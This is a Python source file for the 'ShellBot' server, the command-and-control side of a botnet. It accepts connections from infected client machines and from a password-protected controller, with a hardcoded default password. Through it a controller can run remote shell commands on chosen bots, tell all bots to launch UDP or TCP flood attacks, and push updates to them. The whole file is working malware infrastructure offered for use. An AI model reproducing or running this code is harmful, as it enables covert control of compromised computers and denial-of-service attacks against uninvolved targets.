#!/usr/bin/env python3

# MIT License
##
# Copyright (c) 2017 Sayak Brahmachari
##
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to
# deal in the Software without restriction, including without limitation the
# rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
# sell copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
##
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
##
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
# IN THE SOFTWARE.

import os
import sys
import time
import select
import socket

if len(sys.argv) == 4:
    port = int(sys.argv[1])
    bridgeport = int(sys.argv[2])
    password = sys.argv[3]
else:
    # sys.exit("Usage: server.py <port> <bridge port> <password>")
    print("Usage: server.py <client port> <bridge port> <password>")
    port = 9999 # Clients connect to this port
    bridgeport = 9090 # Controllers connect to this port
    password = '9tian9di' # Password needed by controllers
    print("Using default values - client port:{}, bridge:{}, password:{}"
          .format(port, bridgeport, password))


intro = r"""
 ____ ____ ____ ____ ____ ____ ____ ____
||S |||h |||e |||l |||l |||B |||o |||t ||
||__|||__|||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|

Coded by: Sayak Brahmachari
GitHub: https://github.com/zjw0358
Website: http://mctrl.ml
"""

cli_err = "[SERVER - ERROR] Client closed the connection"
cli_err += "\n[INFO] Retreiving connections again...\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)  # 5 seconds are given for every operation by cients.
s.bind(("0.0.0.0", port))
s.listen(5)

bridge = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
bridge.bind(("0.0.0.0", bridgeport))
bridge.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

allConnections = []
allAddresses = []


def quitClients():
    """Close all Connections"""
    for item in allConnections:
        try:
            item.send(bytes("exit", 'utf-8'))
            item.close()
        except Exception:  # Connection already closed
            pass

    del allConnections[:]
    del allAddresses[:]


def getConnections():
    """Get Client Connections"""
    quitClients()
    while 1:
        try:
            q, addr = s.accept()
            q.setblocking(1)  # No Timeout
            allConnections.append(q)
            allAddresses.append(addr)
        except Exception:  # Time's up
            break


def sendController(msg, q):
    """Communicate with connected controller
    
    Arguments:
        msg {str} -- Message to be sent
        q {socket.socket} -- Controller's socket
    
    Returns:
        int -- Error Code:
                 0) Error
                 1) Success 
    """

    try:
        q.send(msg)
        return 1  # success
    except Exception as ex:
        print('[SERVER] Error:', ex)
        return 0  # fail


def init_controller():
    bridge.listen(0)
    q, _ = bridge.accept()

    cpass = q.recv(20480).decode()

    if (cpass == password):
        return q, True
    else:
        return q, False


def main():
    while 1:
        q, loginsucc = init_controller()

        timeout = time.time() + 500

        breakit = False
        while 1:
            if (loginsucc == False):
                break  # Wrong Pass

            if ((time.time() > timeout) or (breakit == True)):
                break  # 5 min.s passed

            try:
                command = q.recv(20480).decode()
            except Exception as ex:
                print('[SERVER] Error:', ex)
                break

            if (command == "refresh"):
                getConnections()
                if (sendController(bytes("[SERVER] Connections Refreshed\n", 'utf-8'), q) == 0):
                    break

            elif(command == "list"):
                temporary = ""
                for item in allAddresses:
                    temporary += "%d - %s|%s\n" % (
                        allAddresses.index(item) + 1, str(item[0]), str(item[1]))
                if (temporary != ""):
                    if (sendController(bytes(temporary, 'utf-8'), q) == 0):
                        break
                else:
                    if (sendController(bytes("[SERVER] No clients\n", 'utf-8'), q) == 0):
                        break

            elif("interact " in command):
                chosenone = int(command.replace("interact ", "")) - 1
                if ((chosenone < len(allAddresses)) and (chosenone >= 0)):
                    if (sendController(bytes("[SERVER] Interacting with %s\n" % str(
                            allAddresses[chosenone]), 'utf-8'), q) == 0):
                        break

                    try:
                        allConnections[chosenone].send(
                            bytes("hellows123", 'utf-8'))
                        vtpath = allConnections[chosenone].recv(
                            20480).decode() + "$ "

                        if (sendController(bytes(vtpath, 'utf-8'), q) == 0):
                            break

                        while 1:
                            if (time.time() > timeout):  # 5 minutes passed
                                breakit = True
                                break

                            try:
                                # Recieves command
                                data = q.recv(20480).decode()
                            except Exception as ex:
                                print('[SERVER] Error:', ex)
                                breakit = True
                                break

                            try:  # Pass it out to Client and Send back the Response
                                if "cd " in data:
                                    allConnections[chosenone].send(
                                        bytes(data, 'utf-8'))
                                    msg = allConnections[chosenone].recv(
                                        20480).decode()
                                    vtpath = msg + "$ "
                                    if (sendController(bytes(vtpath, 'utf-8'), q) == 0):
                                        breakit = True
                                        break
                                elif data == "stop":
                                    break
                                elif "rawexec" in data:
                                    allConnections[chosenone].send(
                                        bytes(data, 'utf-8'))
                                    while True:
                                        flag = False
                                        read_sockets, _, _ = select.select(
                                            [allConnections[chosenone], q], [], [])
                                        for sock in read_sockets:
                                            if sock == q:
                                                allConnections[chosenone].send(
                                                    q.recv(20480))
                                            else:
                                                data = allConnections[chosenone].recv(
                                                    20480)
                                                if data.decode() == 'stop':
                                                    flag = True
                                                sendController(data, q)
                                        if flag:
                                            break
                                else:
                                    allConnections[chosenone].send(
                                        bytes(data, 'utf-8'))
                                    msg = allConnections[chosenone].recv(
                                        20480).decode()
                                    if (sendController(bytes(msg, 'utf-8'), q) == 0):
                                        breakit = True
                                        break
                            except:
                                if (sendController(bytes(cli_err, 'utf-8'), q) == 0):
                                    breakit = True
                                    break
                                break
                    except:
                        if (sendController(bytes(cli_err, 'utf-8'), q) == 0):
                            break
                        getConnections()
                else:
                    if (sendController(bytes("[SERVER - ERROR] Client doesn't exist\n", 'utf-8'),
                                       q) == 0):
                        break

            elif ("udpfloodall " in command or "tcpfloodall " in command):
                for item in allConnections:
                    try:
                        item.send(bytes(command, 'utf-8'))
                    except:
                        pass
            elif (command == "selfupdateall"):
                for item in allConnections:
                    try:
                        item.send(bytes(command, 'utf-8'))
                    except:
                        pass

            elif(command == "quit"):
                quitClients()
                q.close()
                break
            else:
                if (sendController(bytes("[SERVER - ERROR] Invalid Command\n", 'utf-8'),
                                   q) == 0):
                    break


while 1:
    try:
        main()
    except KeyboardInterrupt:
        quitClients()
    except Exception as ex:
        print('[SERVER] Error:', ex)
        quitClients()

    time.sleep(10)  # Wait 10 seconds before restarting server
